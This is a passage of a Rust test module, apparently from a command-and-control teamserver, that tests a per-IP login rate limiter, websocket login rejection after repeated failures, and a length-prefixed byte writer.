        assert!(limiter.is_allowed(ip_b).await);
    }

    #[tokio::test]
    async fn login_rate_limiter_success_clears_counter() {
        let limiter = LoginRateLimiter::new();
        let ip: IpAddr = "172.16.0.5".parse().expect("valid IP");

        for _ in 0..super::MAX_FAILED_LOGIN_ATTEMPTS - 1 {
            limiter.record_failure(ip).await;
        }
        assert!(limiter.is_allowed(ip).await);

        limiter.record_success(ip).await;
        assert!(limiter.is_allowed(ip).await);
        assert_eq!(limiter.tracked_ip_count().await, 0);
    }

    #[tokio::test]
    async fn login_rate_limiter_prunes_expired_windows_for_one_shot_ips() {
        let limiter = LoginRateLimiter::new();
        let expired_ip: IpAddr = "192.168.10.10".parse().expect("valid IP");
        let fresh_ip: IpAddr = "192.168.10.11".parse().expect("valid IP");

        {
            let mut windows = limiter.windows.lock().await;
            windows.insert(
                expired_ip,
                super::LoginAttemptWindow {
                    failed_attempts: 3,
                    window_start: Instant::now()
                        - super::LOGIN_WINDOW_DURATION
                        - Duration::from_secs(1),
                },
            );
        }

        limiter.record_failure(fresh_ip).await;

        let windows = limiter.windows.lock().await;
        assert!(!windows.contains_key(&expired_ip));
        assert!(windows.contains_key(&fresh_ip));
        assert_eq!(windows.len(), 1);
    }

    #[tokio::test]
    async fn login_rate_limiter_caps_total_tracked_windows() {
        let limiter = LoginRateLimiter::new();
        let now = Instant::now();

        {
            let mut windows = limiter.windows.lock().await;
            for i in 0..super::MAX_LOGIN_ATTEMPT_WINDOWS {
                windows.insert(
                    IpAddr::from(std::net::Ipv4Addr::from(i as u32)),
                    super::LoginAttemptWindow {
                        failed_attempts: 1,
                        window_start: now
                            - Duration::from_secs((super::MAX_LOGIN_ATTEMPT_WINDOWS - i) as u64),
                    },
                );
            }
        }

        let new_ip = IpAddr::from(std::net::Ipv4Addr::new(10, 0, 0, 1));
        limiter.record_failure(new_ip).await;

        let windows = limiter.windows.lock().await;
        assert!(windows.len() <= (super::MAX_LOGIN_ATTEMPT_WINDOWS / 2) + 1);
        assert!(windows.contains_key(&new_ip));
        assert!(!windows.contains_key(&IpAddr::from(std::net::Ipv4Addr::from(0_u32))));
    }

    #[tokio::test]
    async fn websocket_rejects_login_after_too_many_failures() {
        let state = TestState::new().await;
        let rate_limiter = state.login_rate_limiter.clone();
        let ip: IpAddr = "127.0.0.1".parse().expect("valid IP");

        for _ in 0..super::MAX_FAILED_LOGIN_ATTEMPTS {
            rate_limiter.record_failure(ip).await;
        }

        let (mut socket, server) = spawn_server(state).await;

        socket
            .send(ClientMessage::Text(login_message("operator", "password1234").into()))
            .await
            .expect("send should succeed");

        let frame = timeout(Duration::from_secs(3), socket.next())
            .await
            .expect("should receive a frame")
            .expect("frame should exist")
            .expect("frame should decode");

        if let ClientMessage::Text(payload) = frame {
            let msg: OperatorMessage =
                serde_json::from_str(&payload).expect("should parse operator message");
            assert!(
                matches!(msg, OperatorMessage::InitConnectionError(_)),
                "expected connection error, got {msg:?}"
            );
        } else {
            panic!("expected text frame, got {frame:?}");
        }

        server.abort();
    }

    #[test]
    fn write_len_prefixed_bytes_normal_input() -> Result<(), crate::TeamserverError> {
        let mut buf = Vec::new();
        write_len_prefixed_bytes(&mut buf, b"test")?;
        assert_eq!(buf[..4], 4_u32.to_le_bytes());
        assert_eq!(&buf[4..], b"test");
        Ok(())
    }

    #[test]
    fn write_len_prefixed_bytes_empty_input() -> Result<(), crate::TeamserverError> {
        let mut buf = Vec::new();
        write_len_prefixed_bytes(&mut buf, &[])?;
        assert_eq!(buf, 0_u32.to_le_bytes());
        Ok(())
    }
}
